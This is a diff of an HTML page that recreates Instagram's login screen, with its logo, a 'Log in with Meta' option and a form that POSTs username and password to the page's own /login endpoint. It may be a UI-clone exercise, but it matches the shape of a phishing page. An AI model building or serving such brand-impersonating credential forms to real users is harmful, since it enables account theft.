@@ -127,27 +127,36 @@
 
 <body>
 
-<div class="login-container">
-  <div class="back-header">
-    <a class="back-arrow" href="#">&#8249;</a>
-    <h1>Log into Instagram</h1>
-  </div>
+<div class="container">
 
-  <input class="input-field" type="text" placeholder="Mobile number, username or email" required />
-  <input class="input-field" type="password" placeholder="Password" required/>
+    <div class="login-box">
 
-  <button class="btn-login">Log in</button>
+        <div class="logo">
+            <i class="fa-brands fa-instagram"></i>
+        </div>
 
-  <a class="forgot-password" href="#">Forgot password?</a>
+        <div class="logo-text">Instagram</div>
 
-  <div class="divider"></div>
+        <form action="/login" method="POST">
+            <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required>
+            <input type="password" name="password" class="input-field" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
 
-  <button class="btn-facebook">
-    <span class="fb-icon">&#9432;</span>
-    Log in with Facebook
-  </button>
+        <div class="forgot">Forgot password?</div>
 
-  <button class="btn-create">Create new account</button>
+        <div class="divider">OR</div>
+
+        <div class="meta-login">
+            <i class="fa-brands fa-facebook-square"></i> Log in with Meta
+        </div>
+
+        <div class="signup-box">
+            Create new account
+        </div>
+
+    </div>
+
 </div>
 
 </body>
